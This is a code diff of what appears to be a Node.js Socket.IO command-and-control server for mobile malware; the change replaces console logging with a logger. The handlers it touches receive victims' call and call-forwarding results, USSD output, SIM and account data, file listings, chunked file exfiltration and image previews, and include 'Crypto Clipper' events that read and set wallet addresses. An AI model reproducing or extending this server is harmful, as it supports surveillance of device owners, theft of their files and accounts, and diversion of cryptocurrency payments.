-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid call-result data from ${uuid}`);
+      logger.error(`❌ Invalid call-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast call-result event to all web clients
       io.emit("device_event", {
@@ -807,16 +810,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted call_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted call_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [call-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [call-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- CALL FORWARD RESULT from device --------
   socket.on("call-forward-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated call-forward-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated call-forward-result attempt from ${socket.id}`);
       return;
     }
 
@@ -824,18 +827,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid call-forward-result data from ${uuid}`);
+      logger.error(`❌ Invalid call-forward-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [call-forward-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [call-forward-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast call-forward-result event to all web clients
       io.emit("device_event", {
@@ -845,16 +848,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted call_forward_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted call_forward_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [call-forward-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [call-forward-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- USSD RESULT from device --------
   socket.on("ussd-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated ussd-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated ussd-result attempt from ${socket.id}`);
       return;
     }
 
@@ -862,18 +865,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid ussd-result data from ${uuid}`);
+      logger.error(`❌ Invalid ussd-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [ussd-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [ussd-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast ussd-result event to all web clients
       io.emit("device_event", {
@@ -883,16 +886,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted ussd_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted ussd_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [ussd-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [ussd-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- DELETE CALL RESULT from device --------
   socket.on("delete-call-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated delete-call-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated delete-call-result attempt from ${socket.id}`);
       return;
     }
 
@@ -900,18 +903,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid delete-call-result data from ${uuid}`);
+      logger.error(`❌ Invalid delete-call-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [delete-call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [delete-call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast delete-call-result event to all web clients
       io.emit("device_event", {
@@ -921,16 +924,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted delete_call_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted delete_call_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [delete-call-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [delete-call-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- GET ADDRESS RESULT from device (Crypto Clipper) --------
   socket.on("get-address-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated get-address-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated get-address-result attempt from ${socket.id}`);
       return;
     }
 
@@ -938,18 +941,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid get-address-result data from ${uuid}`);
+      logger.error(`❌ Invalid get-address-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [get-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [get-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast get-address-result event to all web clients
       io.emit("device_event", {
@@ -959,16 +962,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted get_address_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted get_address_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [get-address-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [get-address-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- ACTIVE WALLET ADDRESS RESULT from device (Crypto Clipper) --------
   socket.on("activewalletaddress-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated activewalletaddress-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated activewalletaddress-result attempt from ${socket.id}`);
       return;
     }
 
@@ -976,18 +979,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid activewalletaddress-result data from ${uuid}`);
+      logger.error(`❌ Invalid activewalletaddress-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [activewalletaddress-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [activewalletaddress-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast activewalletaddress-result event to all web clients
       io.emit("device_event", {
@@ -997,16 +1000,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted activewalletaddress_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted activewalletaddress_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [activewalletaddress-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [activewalletaddress-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- SET WALLET ADDRESS RESULT from device (Crypto Clipper) --------
   socket.on("set-wallet-address-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated set-wallet-address-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated set-wallet-address-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1014,18 +1017,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid set-wallet-address-result data from ${uuid}`);
+      logger.error(`❌ Invalid set-wallet-address-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [set-wallet-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [set-wallet-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast set-wallet-address-result event to all web clients
       io.emit("device_event", {
@@ -1035,16 +1038,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted set_wallet_address_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted set_wallet_address_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [set-wallet-address-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [set-wallet-address-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- SIM INFO RESULT from device --------
   socket.on("siminfo-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated siminfo-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated siminfo-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1052,18 +1055,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid siminfo-result data from ${uuid}`);
+      logger.error(`❌ Invalid siminfo-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [siminfo-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [siminfo-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast siminfo-result event to all web clients
       io.emit("device_event", {
@@ -1073,31 +1076,31 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted siminfo-result event for ${uuid}`);
+      logger.log(`📤 Broadcasted siminfo-result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [siminfo-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [siminfo-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- ACCOUNT RESULT from device --------
   socket.on("account-result", (data) => {
     // Log data FIRST before any validation
-    console.log(`🔔 [account-result] ========== RAW DATA RECEIVED ==========`);
-    console.log(`🔔 [account-result] Socket ID: ${socket.id}`);
-    console.log(`🔔 [account-result] Data:`, data);
-    console.log(`🔔 [account-result] Data type:`, typeof data);
-    console.log(`🔔 [account-result] Is array:`, Array.isArray(data));
-    console.log(`🔔 [account-result] Is null:`, data === null);
-    console.log(`🔔 [account-result] Is undefined:`, data === undefined);
+    logger.log(`🔔 [account-result] ========== RAW DATA RECEIVED ==========`);
+    logger.log(`🔔 [account-result] Socket ID: ${socket.id}`);
+    logger.log(`🔔 [account-result] Data:`, data);
+    logger.log(`🔔 [account-result] Data type:`, typeof data);
+    logger.log(`🔔 [account-result] Is array:`, Array.isArray(data));
+    logger.log(`🔔 [account-result] Is null:`, data === null);
+    logger.log(`🔔 [account-result] Is undefined:`, data === undefined);
     if (data && typeof data === "object") {
-      console.log(`🔔 [account-result] Data keys:`, Object.keys(data));
-      console.log(`🔔 [account-result] Data stringified:`, JSON.stringify(data, null, 2));
+      logger.log(`🔔 [account-result] Data keys:`, Object.keys(data));
+      logger.log(`🔔 [account-result] Data stringified:`, JSON.stringify(data, null, 2));
     }
-    console.log(`🔔 [account-result] Is authenticated: ${isAuthenticated}, UUID: ${socket.uuid}`);
-    console.log(`🔔 [account-result] =========================================`);
+    logger.log(`🔔 [account-result] Is authenticated: ${isAuthenticated}, UUID: ${socket.uuid}`);
+    logger.log(`🔔 [account-result] =========================================`);
     
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated account-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated account-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1105,13 +1108,13 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data - but still process even if format is unexpected
     if (!data) {
-      console.error(`❌ No data received from ${uuid}`);
+      logger.error(`❌ No data received from ${uuid}`);
       return;
     }
 
@@ -1121,7 +1124,7 @@ io.on("connection", (socket) => {
       
       // If data is not an object, try to parse it or wrap it
       if (typeof data !== "object") {
-        console.warn(`⚠️ [account-result] Data is not an object, attempting to process anyway`);
+        logger.warn(`⚠️ [account-result] Data is not an object, attempting to process anyway`);
         try {
           if (typeof data === "string") {
             processedData = JSON.parse(data);
@@ -1129,13 +1132,13 @@ io.on("connection", (socket) => {
             processedData = { value: data };
           }
         } catch (parseErr) {
-          console.error(`❌ [account-result] Failed to parse data:`, parseErr);
+          logger.error(`❌ [account-result] Failed to parse data:`, parseErr);
           processedData = { raw: data };
         }
       }
       
-      console.log(`📥 [account-result] Processed data from ${uuid}:`, JSON.stringify(processedData, null, 2));
-      console.log(`📥 [account-result] Processed data keys:`, Object.keys(processedData));
+      logger.log(`📥 [account-result] Processed data from ${uuid}:`, JSON.stringify(processedData, null, 2));
+      logger.log(`📥 [account-result] Processed data keys:`, Object.keys(processedData));
       
       // Broadcast account-result event to all web clients
       const eventPayload = {
@@ -1145,24 +1148,24 @@ io.on("connection", (socket) => {
         data: processedData,
       };
       
-      console.log(`📤 [account-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
+      logger.log(`📤 [account-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
       io.emit("device_event", eventPayload);
       
-      console.log(`✅ [account-result] Broadcasted account_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
+      logger.log(`✅ [account-result] Broadcasted account_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
     } catch (err) {
-      console.error(`❌ [account-result] Error processing data from ${uuid}:`, err.message);
-      console.error(`❌ [account-result] Error stack:`, err.stack);
+      logger.error(`❌ [account-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [account-result] Error stack:`, err.stack);
     }
   });
   
   // Also listen for account-result via device-event pattern (fallback)
   socket.on("device-event", (data) => {
-    console.log(`🔍 [device-event] Received device-event from ${socket.id}:`, data);
+    logger.log(`🔍 [device-event] Received device-event from ${socket.id}:`, data);
     if (!isAuthenticated || !socket.uuid) return;
     
     const uuid = socket.uuid;
     if (data && (data.event === "account-result" || data.event === "account_result")) {
-      console.log(`🔔 [device-event] Account result received via device-event pattern from ${uuid}`);
+      logger.log(`🔔 [device-event] Account result received via device-event pattern from ${uuid}`);
       
       const eventPayload = {
         event: "account_result",
@@ -1172,7 +1175,7 @@ io.on("connection", (socket) => {
       };
       
       io.emit("device_event", eventPayload);
-      console.log(`✅ [device-event] Broadcasted account_result event for ${uuid}`);
+      logger.log(`✅ [device-event] Broadcasted account_result event for ${uuid}`);
     }
   });
   
@@ -1189,11 +1192,11 @@ io.on("connection", (socket) => {
   
   accountEventPatterns.forEach(pattern => {
     socket.on(pattern, (data) => {
-      console.log(`🔍 [CATCH-ALL] Received event "${pattern}" from ${socket.id}`);
-      console.log(`🔍 [CATCH-ALL] Data:`, data);
+      logger.log(`🔍 [CATCH-ALL] Received event "${pattern}" from ${socket.id}`);
+      logger.log(`🔍 [CATCH-ALL] Data:`, data);
       
       if (!isAuthenticated || !socket.uuid) {
-        console.warn(`⚠️ [CATCH-ALL] Unauthenticated ${pattern} attempt`);
+        logger.warn(`⚠️ [CATCH-ALL] Unauthenticated ${pattern} attempt`);
         return;
       }
       
@@ -1201,7 +1204,7 @@ io.on("connection", (socket) => {
       const client = clients.get(uuid);
       
       if (!client) {
-        console.error(`❌ [CATCH-ALL] Client not found for UUID: ${uuid}`);
+        logger.error(`❌ [CATCH-ALL] Client not found for UUID: ${uuid}`);
         return;
       }
       
@@ -1213,10 +1216,10 @@ io.on("connection", (socket) => {
           data: data || {},
         };
         
-        console.log(`✅ [CATCH-ALL] Broadcasting account_result from ${pattern}`);
+        logger.log(`✅ [CATCH-ALL] Broadcasting account_result from ${pattern}`);
         io.emit("device_event", eventPayload);
       } catch (err) {
-        console.error(`❌ [CATCH-ALL] Error processing ${pattern}:`, err);
+        logger.error(`❌ [CATCH-ALL] Error processing ${pattern}:`, err);
       }
     });
   });
@@ -1224,7 +1227,7 @@ io.on("connection", (socket) => {
   // -------- DIR RESULT from device --------
   socket.on("dir-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated dir-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated dir-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1232,18 +1235,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid dir-result data from ${uuid}`);
+      logger.error(`❌ Invalid dir-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [dir-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [dir-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast dir-result event to all web clients
       io.emit("device_event", {
@@ -1253,16 +1256,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted dir_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted dir_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [dir-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [dir-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- FILE CHUNK from device (for chunked file downloads) --------
   socket.on("file-chunk", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated file-chunk attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated file-chunk attempt from ${socket.id}`);
       return;
     }
 
@@ -1270,19 +1273,19 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid file-chunk data from ${uuid}`);
+      logger.error(`❌ Invalid file-chunk data from ${uuid}`);
       return;
     }
 
     try {
       // Log raw data first to see what we're actually receiving
-      console.log(`📥 [file-chunk] RAW DATA from ${uuid}:`, JSON.stringify({
+      logger.log(`📥 [file-chunk] RAW DATA from ${uuid}:`, JSON.stringify({
         fileName: data.fileName,
         transferId: data.transferId,
         isLastChunk: data.isLastChunk,
@@ -1299,7 +1302,7 @@ io.on("connection", (socket) => {
                          data.isLastChunk === "1" ||
                          String(data.isLastChunk).toLowerCase() === "true";
       
-      console.log(`📥 [file-chunk] Chunk from ${uuid}:`, {
+      logger.log(`📥 [file-chunk] Chunk from ${uuid}:`, {
         fileName: data.fileName,
         transferId: data.transferId,
         chunkSize: data.chunkSize,
@@ -1319,7 +1322,7 @@ io.on("connection", (socket) => {
       
       // Ensure chunk is included (even if empty string for last chunk)
       if (!('chunk' in cleanData)) {
-        console.warn(`⚠️ [file-chunk] Missing 'chunk' field in data from ${uuid}`);
+        logger.warn(`⚠️ [file-chunk] Missing 'chunk' field in data from ${uuid}`);
         cleanData.chunk = data.chunk || '';
       }
       
@@ -1331,7 +1334,7 @@ io.on("connection", (socket) => {
         data: cleanData,
       };
       
-      console.log(`📤 [file-chunk] Broadcasting to web clients:`, {
+      logger.log(`📤 [file-chunk] Broadcasting to web clients:`, {
         event: eventData.event,
         device_id: eventData.device_id,
         fileName: cleanData.fileName,
@@ -1345,18 +1348,18 @@ io.on("connection", (socket) => {
       io.emit("device_event", eventData);
       
       if (isLastChunk) {
-        console.log(`✅ [file-chunk] File transfer completed for ${uuid}: ${data.fileName}`);
+        logger.log(`✅ [file-chunk] File transfer completed for ${uuid}: ${data.fileName}`);
       }
     } catch (err) {
-      console.error(`❌ [file-chunk] Error processing data from ${uuid}:`, err.message);
-      console.error(`❌ [file-chunk] Error stack:`, err.stack);
+      logger.error(`❌ [file-chunk] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [file-chunk] Error stack:`, err.stack);
     }
   });
 
   // -------- FILE END from device (alternative way device might signal completion) --------
   socket.on("file-end", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated file-end attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated file-end attempt from ${socket.id}`);
       return;
     }
 
@@ -1364,18 +1367,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid file-end data from ${uuid}`);
+      logger.error(`❌ Invalid file-end data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [file-end] File transfer ended for ${uuid}:`, {
+      logger.log(`📥 [file-end] File transfer ended for ${uuid}:`, {
         fileName: data.fileName,
         transferId: data.transferId,
         totalSize: data.totalSize,
@@ -1396,19 +1399,19 @@ io.on("connection", (socket) => {
         },
       };
       
-      console.log(`📤 [file-end] Broadcasting completion as file_chunk event`);
+      logger.log(`📤 [file-end] Broadcasting completion as file_chunk event`);
       io.emit("device_event", eventData);
       
-      console.log(`✅ [file-end] File transfer completed for ${uuid}: ${data.fileName}`);
+      logger.log(`✅ [file-end] File transfer completed for ${uuid}: ${data.fileName}`);
     } catch (err) {
-      console.error(`❌ [file-end] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [file-end] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- DOWNLOAD RESULT from device --------
   socket.on("download-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated download-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated download-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1416,18 +1419,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid download-result data from ${uuid}`);
+      logger.error(`❌ Invalid download-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [download-result] Data from ${uuid}:`, {
+      logger.log(`📥 [download-result] Data from ${uuid}:`, {
         fileName: data.fileName || data.name,
         fileSize: data.fileSize || data.size,
         hasData: !!data.data || !!data.content || !!data.fileData,
@@ -1441,16 +1444,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted download_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted download_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [download-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [download-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- UPLOAD RESULT from device --------
   socket.on("upload-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated upload-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated upload-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1458,18 +1461,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid upload-result data from ${uuid}`);
+      logger.error(`❌ Invalid upload-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [upload-result] Data from ${uuid}:`, {
+      logger.log(`📥 [upload-result] Data from ${uuid}:`, {
         success: data.success,
         message: data.message || data.status,
         fileName: data.fileName || data.name,
@@ -1483,16 +1486,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted upload_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted upload_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [upload-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [upload-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- DELETE RESULT from device --------
   socket.on("delete-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated delete-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated delete-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1500,18 +1503,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid delete-result data from ${uuid}`);
+      logger.error(`❌ Invalid delete-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [delete-result] Data from ${uuid}:`, {
+      logger.log(`📥 [delete-result] Data from ${uuid}:`, {
         success: data.success,
         message: data.message || data.status,
         filePath: data.filePath || data.path,
@@ -1525,22 +1528,22 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted delete_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted delete_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [delete-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [delete-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- IMAGE PREVIEW from device --------
   socket.on("image_preview", (data) => {
-    console.log(`🖼️ [image_preview] ========== EVENT RECEIVED ==========`);
-    console.log(`🖼️ [image_preview] Socket ID: ${socket.id}`);
-    console.log(`🖼️ [image_preview] Is authenticated: ${isAuthenticated}`);
-    console.log(`🖼️ [image_preview] Socket UUID: ${socket.uuid}`);
-    console.log(`🖼️ [image_preview] Data:`, data);
+    logger.log(`🖼️ [image_preview] ========== EVENT RECEIVED ==========`);
+    logger.log(`🖼️ [image_preview] Socket ID: ${socket.id}`);
+    logger.log(`🖼️ [image_preview] Is authenticated: ${isAuthenticated}`);
+    logger.log(`🖼️ [image_preview] Socket UUID: ${socket.uuid}`);
+    logger.log(`🖼️ [image_preview] Data:`, data);
     
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated image_preview attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated image_preview attempt from ${socket.id}`);
       return;
     }
 
@@ -1548,22 +1551,22 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid image_preview data from ${uuid}`);
-      console.error(`❌ Data type: ${typeof data}`);
-      console.error(`❌ Data value:`, data);
+      logger.error(`❌ Invalid image_preview data from ${uuid}`);
+      logger.error(`❌ Data type: ${typeof data}`);
+      logger.error(`❌ Data value:`, data);
       return;
     }
 
-    console.log(`🖼️ [image_preview] Data from ${uuid}:`);
-    console.log(`   FileName: ${data.fileName || "unknown"}`);
-    console.log(`   Thumbnail exists: ${!!data.thumbnail}`);
-    console.log(`   Thumbnail size: ${data.thumbnail ? `${Math.round(data.thumbnail.length / 1024)} KB` : "N/A"}`);
+    logger.log(`🖼️ [image_preview] Data from ${uuid}:`);
+    logger.log(`   FileName: ${data.fileName || "unknown"}`);
+    logger.log(`   Thumbnail exists: ${!!data.thumbnail}`);
+    logger.log(`   Thumbnail size: ${data.thumbnail ? `${Math.round(data.thumbnail.length / 1024)} KB` : "N/A"}`);
 
     // Broadcast to all web clients as device_event
     const broadcastData = {
@@ -1576,18 +1579,18 @@ io.on("connection", (socket) => {
       timestamp: new Date().toISOString(),
     };
     
-    console.log(`🖼️ [image_preview] Broadcasting:`, JSON.stringify(broadcastData, null, 2));
+    logger.log(`🖼️ [image_preview] Broadcasting:`, JSON.stringify(broadcastData, null, 2));
     
     io.emit("device_event", broadcastData);
 
-    console.log(`✅ [image_preview] Broadcasted preview for ${data.fileName || "unknown"} to web clients`);
-    console.log(`🖼️ [image_preview] ===========================================`);
+    logger.log(`✅ [image_preview] Broadcasted preview for ${data.fileName || "unknown"} to web clients`);
+    logger.log(`🖼️ [image_preview] ===========================================`);
   });
 
   // -------- APP RESULT from device --------
   socket.on("app-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated app-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated app-result attempt from ${socket.id}`);
       return;
     }
